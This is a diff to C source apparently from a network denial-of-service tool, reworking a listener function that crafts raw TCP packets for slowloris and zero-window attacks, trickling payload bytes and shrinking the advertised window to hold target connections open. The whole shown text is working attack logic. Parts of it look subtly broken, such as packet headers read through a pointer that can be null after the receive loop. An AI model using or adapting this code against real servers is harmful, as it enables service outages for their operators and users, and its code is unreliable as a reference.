@@ -168,137 +168,148 @@ static void slowy__listen(THREAD_WORK *tw)
   double t;
 
   /* listen the radio */
-  while((m = mqueue_shift(tw->mqueue)) != NULL)
+  while(1)
   {
-    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-            IP_PROTOCOL(m->b),
-            (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
-            (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
-            (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
-            (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
-            TCP_HEADER(m->b)->dest, tc->dhost.port,
-            TCP_HEADER(m->b)->rst,
-            IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
+    /*------------------------------------------------------------------------
+       SEND PACKETS
+      ------------------------------------------------------------------------*/
 
-    c = conn_get(tw, TCP_HEADER(m->b)->dest);
-    if(c)
-      TDBG2("  # (%d) continuing connection", c->sport);
+    /* send scheduled packets */
+    t = pthreadex_time_get();
+    for(i = 0; i < 256; i++)
+      for(c = tc->conns[i]; c; c = c->next)
+        if(c->timeout > 0 && t < c->timeout)
+        {
+          /* send request in one TCP packet */
+          ln_send_tcp_packet(tc->lnc,
+                             &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                             &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                             TH_ACK | TH_PUSH,
+                             ntohs(c->window),
+                             ntohl(c->seq),
+                             ntohl(c->ack),
+                             ((char *) tc->payload) + c->offset, c->tosend,
+                             NULL, 0);
+          c->timeout = 0;
+        }
 
-    /* in some special case (handshake) send kakita */
-    if(TCP_HEADER(m->b)->syn != 0
-    && TCP_HEADER(m->b)->ack != 0
-    && !c)
+    /*------------------------------------------------------------------------
+       PROCESS INPUT PACKETS
+      ------------------------------------------------------------------------*/
+
+    while((m = mqueue_shift(tw->mqueue)) != NULL)
     {
-      /* register connection */
-      c = conn_new(tw, TCP_HEADER(m->b)->dest);
-      TDBG2("  # opening connection (%d - %p)", TCP_HEADER(m->b)->dest, c);
+      TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
+              IP_PROTOCOL(m->b),
+              (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
+              (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
+              (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
+              (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
+              TCP_HEADER(m->b)->dest, tc->dhost.port,
+              TCP_HEADER(m->b)->rst,
+              IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
 
-      /* get mss */
-      c->mss = ln_tcp_get_mss(m->b, m->s);
-      TDBG2("  # (%d) mss = %d", c->sport, c->mss);
+      c = conn_get(tw, TCP_HEADER(m->b)->dest);
+      if(c)
+        TDBG2("  # (%d) continuing connection", c->sport);
 
-      /* prepare first request packet to schedule (common for both attacks) */
-      c->offset  = 0;
-      c->window  = tc->window;
-      c->seq     = ntohl(TCP_HEADER(m->b)->ack_seq);
-      c->ack     = ntohl(TCP_HEADER(m->b)->seq) + 1;
-      c->flags   = TH_ACK;
-
-      /* send handshake */
-      TDBG2("  # (%d) sending handshake", c->sport);
-      TERR("  # (%d) window %d", c->sport, c->window);
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         c->flags,
-                         c->window,
-                         c->seq,
-                         c->ack,
-                         NULL, 0,
-                         NULL, 0);
-    }
-
-    if(!c)
-    {
-      TDBG("Ignored connection at port %d.", TCP_HEADER(m->b)->dest);
-      continue;
-    }
-
-    if(TCP_HEADER(m->b)->ack != 0)
-    {
-      int s;
-
-      /* decide how much to send ... */
-      s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;
-
-      /* (both) send data (if there is any available) */
-      if(c->offset + s < tc->payload_size)
+      /* in some special case (handshake) send kakita */
+      if(TCP_HEADER(m->b)->syn != 0
+      && TCP_HEADER(m->b)->ack != 0
+      && !c)
       {
-        c->tosend  = s;
+        /* register connection */
+        c = conn_new(tw, TCP_HEADER(m->b)->dest);
+        TDBG2("  # opening connection (%d - %p)", TCP_HEADER(m->b)->dest, c);
+
+        /* get mss */
+        c->mss = ln_tcp_get_mss(m->b, m->s);
+        TDBG2("  # (%d) mss = %d", c->sport, c->mss);
+
+        /* prepare first request packet to schedule (common for both attacks) */
+        c->offset  = 0;
+        c->window  = tc->window;
+        c->seq     = ntohl(TCP_HEADER(m->b)->ack_seq);
+        c->ack     = ntohl(TCP_HEADER(m->b)->seq) + 1;
         c->flags   = TH_ACK;
-      } else {
-        c->tosend  = tc->payload_size - c->offset;
-        c->flags   = c->tosend > 0 ? TH_ACK | TH_PUSH : TH_ACK;
-      }
 
-      /* decide other parameters (depending on attack) */
-      c->timestamp = pthreadex_time_get();
-      c->timeout   = 0.0;
-      if(tc->zerowin)
-      {
-        /* (zerowin) */
-        s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
-        c->window = c->window > s ? c->window - s : 0;
-        if(c->window == 0)
-          c->timeout = tc->ntimeout;
-      } else {
-        /* (slowloris) */
-        if(c->tosend > 0)
-          c->timeout = tc->ntimeout;
-      }
-    } else
-    if(TCP_HEADER(m->b)->fin != 0
-    || TCP_HEADER(m->b)->rst != 0)
-    {
-      /* kill connection */
-      /*   - (fin) schedule fin/ack packet */
-      if(!TCP_HEADER(m->b)->rst)
+        /* send handshake */
+        TDBG2("  # (%d) sending handshake", c->sport);
+        TERR("  # (%d) window %d", c->sport, c->window);
         ln_send_tcp_packet(tc->lnc,
                            &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                            &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                           TH_FIN | TH_ACK,
-                           ntohs(TCP_HEADER(m->b)->window),
-                           ntohl(TCP_HEADER(m->b)->ack_seq),
-                           ntohl(TCP_HEADER(m->b)->seq) + 1,
+                           c->flags,
+                           c->window,
+                           c->seq,
+                           c->ack,
                            NULL, 0,
                            NULL, 0);
-
-      /*   - (fin&rst) remove directly */
-      conn_release(tw, c);
-    }
-
-    /* release msg buffer */
-    msg_release(m);
-  }
-
-  /* send scheduled packets */
-  t = pthreadex_time_get();
-  for(i = 0; i < 256; i++)
-    for(c = tc->conns[i]; c; c = c->next)
-      if(c->timeout > 0 && t < c->timeout)
-      {
-        /* send request in one TCP packet */
-        ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                           TH_ACK | TH_PUSH,
-                           ntohs(c->window),
-                           ntohl(c->seq),
-                           ntohl(c->ack),
-                           ((char *) tc->payload) + c->offset, c->tosend,
-                           NULL, 0);
-        c->timeout = 0;
       }
+
+      if(!c)
+      {
+        TDBG("Ignored connection at port %d.", TCP_HEADER(m->b)->dest);
+        continue;
+      }
+
+      if(TCP_HEADER(m->b)->ack != 0)
+      {
+        int s;
+
+        /* decide how much to send ... */
+        s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;
+
+        /* (both) send data (if there is any available) */
+        if(c->offset + s < tc->payload_size)
+        {
+          c->tosend  = s;
+          c->flags   = TH_ACK;
+        } else {
+          c->tosend  = tc->payload_size - c->offset;
+          c->flags   = c->tosend > 0 ? TH_ACK | TH_PUSH : TH_ACK;
+        }
+
+        /* decide other parameters (depending on attack) */
+        c->timestamp = pthreadex_time_get();
+        c->timeout   = 0.0;
+        if(tc->zerowin)
+        {
+          /* (zerowin) */
+          s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
+          c->window = c->window > s ? c->window - s : 0;
+          if(c->window == 0)
+            c->timeout = tc->ntimeout;
+        } else {
+          /* (slowloris) */
+          if(c->tosend > 0)
+            c->timeout = tc->ntimeout;
+        }
+      } else
+      if(TCP_HEADER(m->b)->fin != 0
+      || TCP_HEADER(m->b)->rst != 0)
+      {
+        /* kill connection */
+        /*   - (fin) schedule fin/ack packet */
+        if(!TCP_HEADER(m->b)->rst)
+          ln_send_tcp_packet(tc->lnc,
+                             &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                             &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                             TH_FIN | TH_ACK,
+                             ntohs(TCP_HEADER(m->b)->window),
+                             ntohl(TCP_HEADER(m->b)->ack_seq),
+                             ntohl(TCP_HEADER(m->b)->seq) + 1,
+                             NULL, 0,
+                             NULL, 0);
+
+        /*   - (fin&rst) remove directly */
+        conn_release(tw, c);
+      }
+
+      /* release msg buffer */
+      msg_release(m);
+    }
+  }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
